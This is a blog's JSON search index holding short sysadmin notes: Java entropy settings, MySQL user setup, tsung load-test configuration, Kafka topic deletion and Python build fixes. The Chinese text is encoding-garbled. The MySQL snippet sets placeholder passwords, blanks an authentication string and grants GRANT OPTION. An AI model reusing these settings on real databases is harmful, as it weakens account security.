/usr/java/jdk1.8.0_121/jre/lib/security/java.security securerandom.source=file:/dev/random å¯ä»¥çœ‹åˆ°é»˜è®¤å€¼æ˜¯ï¼š/dev/randomã€‚æ‰€ä»¥ç¨‹åºå¯åŠ¨åSecureRandomç±»ä¼šè¯»å–/dev/randomä»¥è·å–éšæœºåºåˆ—ï¼Œè¿™æ˜¯ä¸€ä¸ªåŒæ­¥æ“ä½œã€‚å½“ç†µæ± ï¼ˆentropy poolï¼‰ ä¸­æ²¡æœ‰è¶³å¤Ÿçš„ç†µæ—¶ï¼Œè¯»å–/dev/randomå°±ä¼šé€ æˆé˜»å¡ï¼Œç›´åˆ°æ”¶é›†åˆ°äº†è¶³å¤Ÿçš„ç†µï¼Œç¨‹åºæ‰ä¼šç»§ç»­å¾€ä¸‹è¿›è¡Œã€‚è§£å†³æ–¹æ³•æ˜¯ä¿®æ”¹æˆéé˜»å¡çš„ç†µæº/dev/urandomã€‚å¯ä»¥ä¿®æ”¹java.securityæ–‡ä»¶ä¸­çš„securerandom.sourceå€¼ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å‚æ•°java.security.egdï¼š java -jar app.jar -Djava.security.egd=file:/dev/./urandom è‡³äºä¸ºä»€ä¹ˆæ˜¯/dev/./urandomï¼Œè€Œä¸æ˜¯/dev/urandomï¼Œè¿™æºäºjavaçš„ä¸€ä¸ªbugã€‚å¤§æ„æ˜¯/dev/urandomåœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½è¿˜æ˜¯æœ€ç»ˆä¼šè½¬æ¢æˆè°ƒç”¨/dev/randomã€‚æ‰€ä»¥ä¸ºäº†ä¿é™©èµ·è§ï¼Œè¿˜æ˜¯ä½¿ç”¨/dev/./urandomå§ï¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"springboot","slug":"springboot","permalink":"https://wangxiuwen.github.io/tags/springboot/"}],"author":"wangxiuwen"},{"title":"æœºå™¨å­¦ä¹ å¼€å‘ç¯å¢ƒ(python)","slug":"history/tech/59548da45d68c4453ced2dc7","date":"2017-06-28T17:18:28.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/59548da45d68c4453ced2dc7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59548da45d68c4453ced2dc7/","excerpt":"","text":"ç”¨pycharm+anacondaç»„åˆéœ€è¦å®‰è£…çš„ python åŒ…: sklearn","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"machine","slug":"machine","permalink":"https://wangxiuwen.github.io/tags/machine/"}],"author":"wangxiuwen"},{"title":"mysql5.7 æ·»åŠ ç”¨æˆ·","slug":"history/tech/5953ae76b58108ec343cf66b","date":"2017-06-28T01:26:14.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953ae76b58108ec343cf66b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953ae76b58108ec343cf66b/","excerpt":"","text":"åˆ›å»ºç”¨æˆ·ï¼š CREATE USER 'cms'@'%' IDENTIFIED BY 'password'; æ§åˆ¶æƒé™ï¼š GRANT ALL ON drupal.* TO 'cms'@'%'; GRANT SELECT ON drupal TO 'cms'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION; ä¿®æ”¹pluginï¼š select user,host,plugin,password,authentication_string from user; update user set plugin = &quot;mysql_native_password&quot; where user = 'test_user'; ä¿®æ”¹å¯†ç  ï¼š update user set authentication_string = &quot;&quot; where user = 'test_user'; update user set password = PASSWORD('test_user') where user = 'test_user';","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mysql5.7","slug":"mysql5-7","permalink":"https://wangxiuwen.github.io/tags/mysql5-7/"}],"author":"wangxiuwen"},{"title":"tsung å‹åŠ›æµ‹è¯•","slug":"history/tech/5953abf8b58108ec343cf66a","date":"2017-06-28T01:15:36.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/tech/5953abf8b58108ec343cf66a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953abf8b58108ec343cf66a/","excerpt":"","text":"date: 2017-06-27 09:11:14 å®‰è£…å®‰è£… erlang ç¯å¢ƒ: apt install erlang å®‰è£… gnuplot: apt install gnuplot # tsung_stats.pl éœ€è¦ç”¨åˆ°çš„ gnuplot å®‰è£… tsung(http://tsung.erlang-projects.org/dist/): wget http://tsung.erlang-projects.org/dist/tsung-1.6.0.tar.gz tar -zxf tsung-1.6.0.tar.gz cd tsung-1.6.0 ./configure # é…ç½®ï¼Œç”Ÿæˆ Makefile æ–‡ä»¶ make -j4 make install ä¸‹è½½å¹¶å®‰è£…perl Template,ç”¨äºç”ŸæˆæŠ¥å‘Šæ¨¡ç‰ˆ: wget http://cpan.org/modules/by-module/Template/Template-Toolkit-2.24.tar.gz tar -zxvf Template-Toolkit-2.24.tar.gz cd Template-Toolkit-2.24 perl Makefile.PL make make test make install è¯´æ˜ç¤ºä¾‹æ–‡ä»¶: /root/tsung-1.6.0/examples æ‹·è´ç¤ºä¾‹: mkdir /root/http_simple cd /root/http_simple cp /root/tsung-1.6.0/examples/examples/http_simple.xml ./ æµ‹è¯•:tsung -f http_simple.xml start # é»˜è®¤ä½¿ç”¨ ~/.tsung/tsung.xml, å¯æŒ‡å®šæŸ¥çœ‹å®æ—¶è®°å½•: tail -f ~/.tsung/log/20170627-0908/tsung.log ç”ŸæˆæŠ¥è¡¨: /usr/lib/tsung/bin/tsung_stats.pl --stats ~/.tsung/log/20170627-0908/tsung.log # http_simple ç›®å½•ä¸‹ç”Ÿæˆ3ä¸ªç›®å½•å’Œ1ä¸ª log æ–‡ä»¶ï¼Œå…¶ä¸­ images ç›®å½•ä¸‹å°±æ˜¯æŠ¥è¡¨å›¾ç‰‡ é…ç½®æ–‡ä»¶ clients: &lt;clients&gt; &lt;client host=&quot;localhost&quot; use_controller_vm=&quot;true&quot; maxusers=&quot;30000&quot;/&gt; &lt;/clients&gt; tsungè¿è¡Œæ—¶å¯ä»¥ç”±å¾ˆå¤šçš„è™šæ‹Ÿæœºç»„æˆï¼Œclienté…ç½®æŒ‡æ˜è¿™ä¸ªclientæœºå™¨ä¸Šæœ€å¤šç”Ÿæˆçš„ç”¨æˆ·æ•°ï¼Œå¦‚æœuse_controller_vmä¸ºtrueçš„è¯ï¼Œé‚£ä¹ˆå½“ç”¨æˆ·æ•°è¾¾åˆ°maxusersï¼Œtsungä¼šè‡ªåŠ¨ç”Ÿæˆæ–°çš„VMã€‚ servers: &lt;servers&gt; &lt;server host=&quot;api.evcos.wm-motor.com&quot; port=&quot;80&quot; type=&quot;tcp&quot;&gt;&lt;/server&gt; &lt;/servers&gt; ä¹Ÿå¯ä»¥é…ç½®æˆé›†ç¾¤: &lt;servers&gt; &lt;server host=&quot;server1&quot; port=&quot;80&quot; type=&quot;tcp&quot; weight=&quot;4&quot;&gt;&lt;/server&gt; &lt;server host=&quot;server2&quot; port=&quot;80&quot; type=&quot;tcp&quot; weight=&quot;1&quot;&gt;&lt;/server&gt; &lt;/servers&gt; tsungä¼šæ ¹æ®weightå€¼æ¥é€‰æ‹©å‘èµ·è¯·æ±‚çš„serverhttps: &lt;servers&gt; &lt;server host=â€web_server_nameâ€ port=â€443â€³ type=â€sslâ€œ&gt;&lt;/server&gt; &lt;/servers&gt; https://jackiechen.org/2015/12/04/use-tsung-to-test-https-site/ monitoring &lt;monitoring&gt; &lt;monitor host=&quot;garden&quot; type=&quot;erlang&quot;&gt; &lt;mysqladmin port=&quot;3306&quot; username=&quot;root&quot; /&gt; &lt;/monitor&gt; &lt;/monitoring&gt; ç³»ç»Ÿç›‘æ§æœåŠ¡ï¼Œé…ç½®å®Œåå¯è·å–è¢«æµ‹serverçš„cpuï¼Œå†…å­˜ï¼Œè´Ÿè½½ï¼Œæ•°æ®åº“çš„ç›¸å…³ä¿¡æ¯ã€‚å¯ä»¥é…ç½®æˆerlangçš„ç›‘æ§æœåŠ¡å’Œsnmpçš„ç›‘æ§æœåŠ¡ã€‚ load &lt;load&gt; &lt;arrivalphase phase=&quot;1&quot; duration=&quot;3&quot; unit=&quot;minute&quot;&gt; &lt;users maxnumber=&quot;100&quot; interarrival=&quot;0.02&quot; unit=&quot;second&quot; &gt;&lt;/users&gt; &lt;/arrivalphase&gt; &lt;/load&gt; loadæ®µå¯é…ç½®è®¿é—®çš„è´Ÿè½½ï¼Œè®¿é—®å¯ä»¥é…æˆå¤šä¸ªé˜¶æ®µï¼Œç”±phaseå€¼æŒ‡å®šã€‚durationæ˜¯æµ‹è¯•æŒç»­æ—¶é—´ï¼Œunitæ˜¯å•ä½ã€‚usersæ®µçš„maxnumberé™åˆ¶äº†ç”Ÿæˆçš„æœ€å¤§ç”¨æˆ·æ•°ï¼Œinterarrival=â€0.02â€è¡¨ç¤º0.02ç§’äº§ç”Ÿä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œç”¨æˆ·æŒ‰ç…§sessionçš„é…ç½®é¡ºåºæ‰§è¡Œsessionä¸­çš„requestã€‚ options &lt;options&gt; &lt;option type=&quot;ts_http&quot; name=&quot;user_agent&quot;&gt; &lt;user_agent probability=&quot;80&quot;&gt;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050513 Galeon/1.3.21&lt;/user_agent&gt; &lt;user_agent probability=&quot;20&quot;&gt;Mozilla/5.0 (Windows; U; Windows NT 5.2; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4&lt;/user_agent&gt; &lt;/option&gt; &lt;/options&gt; sessions &lt;sessions&gt; &lt;session name=&quot;http-example&quot; probability=&quot;70&quot; type=&quot;ts_http&quot;&gt; &lt;setdynvars sourcetype=&quot;random_number&quot; start=&quot;1&quot; end =&quot;100&quot;&gt; &lt;var name=&quot;itemid&quot; /&gt; &lt;/setdynvars&gt; &lt;transaction name='getlist'&gt; &lt;request subst=&quot;true&quot;&gt; &lt;http url=&quot;/comment/getList&quot; method=&quot;POST&quot; contents = &quot;item_type=image&amp;amp;item_id=%%_itemid%%&quot;&gt;&lt;/http&gt; &lt;/request&gt; &lt;/transaction&gt; &lt;/session&gt; &lt;session name=&quot;http-example&quot; probability=&quot;30&quot; type=&quot;ts_http&quot;&gt; &lt;setdynvars sourcetype=&quot;random_number&quot; start=&quot;1&quot; end=&quot;100&quot;&gt; &lt;var name=&quot;itemid&quot; /&gt; &lt;/setdynvars&gt; &lt;setdynvars sourcetype=&quot;random_number&quot; start=&quot;20&quot; end=&quot;5000000&quot;&gt; &lt;var name=&quot;content&quot; /&gt; &lt;/setdynvars&gt; &lt;transaction name='getlist'&gt; &lt;request subst=&quot;true&quot;&gt; &lt;http url=&quot;/comment/addComment&quot; method=&quot;POST&quot; contents = &quot;item_type=image&amp;amp;item_id=%%_itemid%%&amp;amp;content=%%_content%%&quot;&gt;&lt;/http&gt; &lt;/request&gt; &lt;/transaction&gt; &lt;/session&gt; &lt;/sessions&gt; å¯é…ç½®å¤šä¸ªå­sessionï¼Œè¿›è€Œå¯æµ‹è¯•å¤šä¸ªapiï¼Œå¯ä»¥è®¾ç½®è¯·æ±‚æ¦‚ç‡ï¼Œåœ¨probabilityé‡Œè¢«å®šä¹‰ï¼Œè¦æ±‚æ¯ä¸ªsessionçš„probabilityä¹‹å’Œæ˜¯100ã€‚ç±»å‹æ˜¯httpã€‚sessionsé‡Œå¯ç”¨foræ¥è®¾å®šè¯·æ±‚æ¬¡æ•°ï¼Œå¦‚ä¸‹: &lt;for from=&quot;1&quot; to=&quot;@loop&quot; incr=&quot;1&quot; var=&quot;counter&quot;&gt; åœ¨é‡Œé¢å¯ä»¥è®¾ç½®è¯·æ±‚çš„å…·ä½“ä¿¡æ¯ã€‚åœ¨è¯·æ±‚å‚æ•°é‡Œå¯ä»¥å¸¦ä¸Šéšæœºæ•°ã€‚éšæœºæ•°å’Œéšæœºå­—ç¬¦ä¸²çš„å®šä¹‰å¦‚ä¸‹: &lt;setdynvars sourcetype=&quot;random_number&quot; start=&quot;20&quot; end=&quot;5000000&quot;&gt; &lt;var name=&quot;xxx&quot; /&gt; &lt;/setdynvars&gt; &lt;setdynvars sourcetype=&quot;random_string&quot; length=&quot;10&quot;&gt; &lt;var name=&quot;xxx&quot; /&gt; &lt;/setdynvars&gt; ä»¥%%_xxx%%çš„å½¢å¼æ¥è°ƒç”¨ï¼Œè¿™é‡Œå¿…é¡»æ³¨æ„çš„æ˜¯ï¼Œè¦ä½¿ç”¨éšæœºæ•°ï¼Œrequestå¿…é¡»åŠ ä¸Šsubst=â€trueâ€å‚æ•°ï¼Œä¸ç„¶éšæœºæ•°æ— æ³•è¢«å¼•ç”¨æˆåŠŸã€‚éšæœºæ•°ä¹Ÿå¯ä»æ–‡ä»¶è¯»å–ï¼Œå¦‚csvã€‚httpå†…éƒ¨å¯å®šä¹‰headerå‚æ•°: &lt;http_header name=&quot;Authorization&quot; value=&quot;111&quot;/&gt; &lt;http_header name=&quot;Cookie&quot; value=&quot;authToken=%%_auth_token%%; Path=/&quot;/&gt; &lt;!-- content-Typeï¼šPOSTè¯·æ±‚å‚æ•°çš„æ ¼å¼ï¼Œå¦‚æœæ˜¯jsonæ ¼å¼å¯ä»¥è¿™æ ·å†™ --&gt; &lt;http_header name=&quot;Content-Type&quot; value=&quot;application/json&quot;/&gt; thinktimeå¯ç”¨äºå®šä¹‰ä¸¤ä¸ªè¯·æ±‚çš„é—´éš”æ—¶é—´: &lt;thinktime value=&quot;1&quot;/&gt; å¦å¤–å¯å®šä¹‰ä¸åŒçš„transaction ï¼Œè¿™æ ·å­ç»“æœé‡Œå°±ä¼šæ˜¾ç¤ºä¸åŒtransactionçš„å…·ä½“ä¿¡æ¯ã€‚ ç”ŸæˆæŠ¥å‘Š /usr/lib/tsung/bin/tsung_stats.pl --stats /root/.tsung/log/20170627-1144/tsung.log æŸ¥çœ‹æŠ¥å‘Š report.html æ³¨æ„tsungæµ‹è¯•HTTPæœåŠ¡å™¨æ—¶ï¼ŒGETæˆ–POSTæ–¹æ³•æœ‰æ—¶éœ€é…ç½®å‚æ•°ã€‚å‚æ•°å›ºå®šçš„æƒ…å†µ:GETï¼š &lt;http url='http://www.xxx/v1/xxx?var=3&amp;amp;b=4' method='GET'/&gt; æ³¨æ„ï¼Œå¦‚æœå¤šä¸ªå˜é‡è¿æ¥å¿…é¡»ç”¨å®ä½“&amp;amp; è€Œä¸æ˜¯å•ç‹¬çš„ '&amp;' POSTï¼š &lt;http url='http://www.xxx/v1/xxx' method='POST' contents='username=admin&amp;passwd=123456'/&gt; æ³¨æ„ï¼špostæ–¹æ³•ä¸­ä¸éœ€è¦å†™å®ä½“ï¼Œç›´æ¥ç”¨'&amp;' æ–‡æ¡£:Tsung 1.6.0 documentationLoad Testing using TsungTest the Performance and Scalability of Your Web Applications With Tsungå‹åŠ›æµ‹è¯•å·¥å…·tsungç”¨æ³•ç®€ä»‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"pressure_test","slug":"pressure-test","permalink":"https://wangxiuwen.github.io/tags/pressure-test/"}],"author":"wangxiuwen"},{"title":"ç“¦åŠ›èƒŒæ™¯","slug":"history/training/59535957c7b0042a6cd9c320","date":"2017-06-27T19:23:03.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/training/59535957c7b0042a6cd9c320/","link":"","permalink":"https://wangxiuwen.github.io/history/training/59535957c7b0042a6cd9c320/","excerpt":"","text":"ç“¦åŠ›èƒŒæ™¯","categories":[{"name":"åŸ¹è®­","slug":"åŸ¹è®­","permalink":"https://wangxiuwen.github.io/categories/%E5%9F%B9%E8%AE%AD/"}],"tags":[{"name":"training","slug":"training","permalink":"https://wangxiuwen.github.io/tags/training/"},{"name":"åŸ¹è®­","slug":"åŸ¹è®­","permalink":"https://wangxiuwen.github.io/tags/%E5%9F%B9%E8%AE%AD/"}],"author":"wangxiuwen"},{"title":"python å®‰è£… ansibleæŠ¥é”™","slug":"history/tech/5953c73311a1d5578f3f9a6d","date":"2017-06-12T22:00:39.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a6d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a6d/","excerpt":"","text":"æŠ¥é”™: Command &amp;quot;/usr/bin/python -u -c &amp;quot;import setuptools, tokenize;__file__='/tmp/pip-build-wP1NZu/cryptography/setup.py';f=getattr(tokenize, 'open', open)(__file__);code=f.read().replace('\\r\\n', '\\n');f.close();exec(compile(code, __file__, 'exec'))&amp;quot; install --record /tmp/pip-Bjx54G-record/install-record.txt --single-version-externally-managed --compile&amp;quot; failed with error code 1 in /tmp/pip-build-wP1NZu/cryptography/ è§£å†³ï¼š apt install libssl-dev -y","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"ImportError  No module named _sqlite3","slug":"history/tech/5953c73311a1d5578f3f9a6c","date":"2017-06-05T01:03:04.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a6c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a6c/","excerpt":"","text":"1ImportError: No module named _sqlite3è§£å†³æ–¹æ¡ˆï¼š1LDFLAGS=&amp;quot;-L/usr/local/opt/sqlite/lib -L/usr/local/opt/zlib/lib&amp;quot; CPPFLAGS=&amp;quot;-I/usr/local/opt/sqlite/include -I/usr/local/opt/zlib/include&amp;quot; pyenv install -v 3.4.5","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"kafkaå½»åº•åˆ é™¤topicçš„ä¸¤ç§æ–¹æ³•","slug":"history/tech/5953c73311a1d5578f3f9a6b","date":"2017-05-23T18:10:32.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a6b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a6b/","excerpt":"","text":"æ–¹æ³•ä¸€ï¼šå¿«é€Ÿé…ç½®åˆ é™¤æ³•1.kafkaå¯åŠ¨ä¹‹å‰ï¼Œåœ¨server.propertiesé…ç½®delete.topic.enable=true2.æ‰§è¡Œå‘½ä»¤bin/kafka-topics.sh --delete --topic test --zookeeper zk:2181æˆ–è€…ä½¿ç”¨kafka-manageré›†ç¾¤ç®¡ç†å·¥å…·åˆ é™¤æ³¨æ„ï¼šå¦‚æœkafkaå¯åŠ¨ä¹‹å‰æ²¡æœ‰é…ç½®delete.topic.enable=trueï¼Œtopicåªä¼šæ ‡è®°ä¸ºmarked for deletionï¼ŒåŠ ä¸Šé…ç½®ï¼Œé‡å¯kafkaï¼Œä¹‹å‰çš„topickå°±çœŸæ­£åˆ é™¤äº†ã€‚æ–¹æ³•äºŒï¼šæ‰‹åŠ¨åˆ é™¤æ³•ï¼ˆä¸æ¨èï¼‰å‰æï¼šä¸å…è®¸æ›´æ”¹server.propertiesé…ç½®1.åˆ é™¤zkä¸‹é¢topicï¼ˆtestï¼‰å¯åŠ¨bin/zkCli.shls /brokers/topicsrmr /brokers/topics/testls /brokers/topicsæŸ¥topicæ˜¯å¦åˆ é™¤ï¼šbin/kafka-topics.sh --list --zookeeper zk:21812.åˆ é™¤å„brokerä¸‹topicæ•°æ®ï¼Œé»˜è®¤ç›®å½•ä¸º/tmp/kafka-logs","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"kafka","slug":"kafka","permalink":"https://wangxiuwen.github.io/tags/kafka/"}],"author":"wangxiuwen"},{"title":"arange å’Œ linspace çš„åŒºåˆ«","slug":"history/tech/5953c73311a1d5578f3f9a6a","date":"2017-04-05T18:45:20.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a6a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a6a/","excerpt":"","text":"arange()ç±»ä¼¼äºå†…ç½®å‡½æ•°range()ï¼Œé€šè¿‡æŒ‡å®šå¼€å§‹å€¼ã€ç»ˆå€¼å’Œæ­¥é•¿åˆ›å»ºè¡¨ç¤ºç­‰å·®æ•°åˆ—çš„ä¸€ç»´æ•°ç»„ï¼Œæ³¨æ„å¾—åˆ°çš„ç»“æœæ•°ç»„ä¸åŒ…å«ç»ˆå€¼ã€‚ linspace()é€šè¿‡æŒ‡å®šå¼€å§‹å€¼ã€ç»ˆå€¼å’Œå…ƒç´ ä¸ªæ•°åˆ›å»ºè¡¨ç¤ºç­‰å·®æ•°åˆ—çš„ä¸€ç»´æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡endpointå‚æ•°æŒ‡å®šæ˜¯å¦åŒ…å«ç»ˆå€¼ï¼Œé»˜è®¤å€¼ä¸ºTrueï¼Œå³åŒ…å«ç»ˆå€¼ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"vsftpd æ— æ³•ç™»å½•","slug":"history/tech/5953c73311a1d5578f3f9a69","date":"2017-03-02T01:12:48.000Z","updated":"2020-11-29T01:42:08.759Z","comments":true,"path":"history/tech/5953c73311a1d5578f3f9a69/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c73311a1d5578f3f9a69/","excerpt":"","text":"pam_service_name=ftp","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"python é˜¿é‡Œäº‘é•œåƒ","slug":"history/tech/5953c4d0c2b92f5665eeda68","date":"2017-02-28T18:01:50.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda68/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda68/","excerpt":"","text":"http://mirrors.aliyun.com/pypi/simple/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"Mac OS X ä¸Šä¿®æ”¹ä¸»æœºå","slug":"history/tech/5953c4d0c2b92f5665eeda67","date":"2016-10-22T02:20:06.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda67/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda67/","excerpt":"","text":"ä¿®æ”¹ä¸»æœºåç§°:sudo scutil --set HostName MacBookPro ä¿®æ”¹å…±äº«åç§°:sudo scutil --set ComputerName MacBookPro","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"TPSå’ŒQPSçš„åŒºåˆ«","slug":"history/tech/5953c4d0c2b92f5665eeda66","date":"2016-09-29T03:28:05.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda66/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda66/","excerpt":"","text":"ä¸€ã€TPSï¼šTransactions Per Secondï¼ˆæ¯ç§’ä¼ è¾“çš„äº‹ç‰©å¤„ç†ä¸ªæ•°ï¼‰ï¼Œå³æœåŠ¡å™¨æ¯ç§’å¤„ç†çš„äº‹åŠ¡æ•°ã€‚TPSåŒ…æ‹¬ä¸€æ¡æ¶ˆæ¯å…¥å’Œä¸€æ¡æ¶ˆæ¯å‡ºï¼ŒåŠ ä¸Šä¸€æ¬¡ç”¨æˆ·æ•°æ®åº“è®¿é—®ã€‚ï¼ˆä¸šåŠ¡TPS = CAPS Ã— æ¯ä¸ªå‘¼å«å¹³å‡TPSï¼‰TPSæ˜¯è½¯ä»¶æµ‹è¯•ç»“æœçš„æµ‹é‡å•ä½ã€‚ä¸€ä¸ªäº‹åŠ¡æ˜¯æŒ‡ä¸€ä¸ªå®¢æˆ·æœºå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ç„¶åæœåŠ¡å™¨åšå‡ºååº”çš„è¿‡ç¨‹ã€‚å®¢æˆ·æœºåœ¨å‘é€è¯·æ±‚æ—¶å¼€å§‹è®¡æ—¶ï¼Œæ”¶åˆ°æœåŠ¡å™¨å“åº”åç»“æŸè®¡æ—¶ï¼Œä»¥æ­¤æ¥è®¡ç®—ä½¿ç”¨çš„æ—¶é—´å’Œå®Œæˆçš„äº‹åŠ¡ä¸ªæ•°ã€‚ä¸€èˆ¬çš„ï¼Œè¯„ä»·ç³»ç»Ÿæ€§èƒ½å‡ä»¥æ¯ç§’é’Ÿå®Œæˆçš„æŠ€æœ¯äº¤æ˜“çš„æ•°é‡æ¥è¡¡é‡ã€‚ç³»ç»Ÿæ•´ä½“å¤„ç†èƒ½åŠ›å–å†³äºå¤„ç†èƒ½åŠ›æœ€ä½æ¨¡å—çš„TPSå€¼ã€‚äºŒã€QPSï¼šæ¯ç§’æŸ¥è¯¢ç‡QPSæ˜¯å¯¹ä¸€ä¸ªç‰¹å®šçš„æŸ¥è¯¢æœåŠ¡å™¨åœ¨è§„å®šæ—¶é—´å†…æ‰€å¤„ç†æµé‡å¤šå°‘çš„è¡¡é‡æ ‡å‡†ï¼Œåœ¨å› 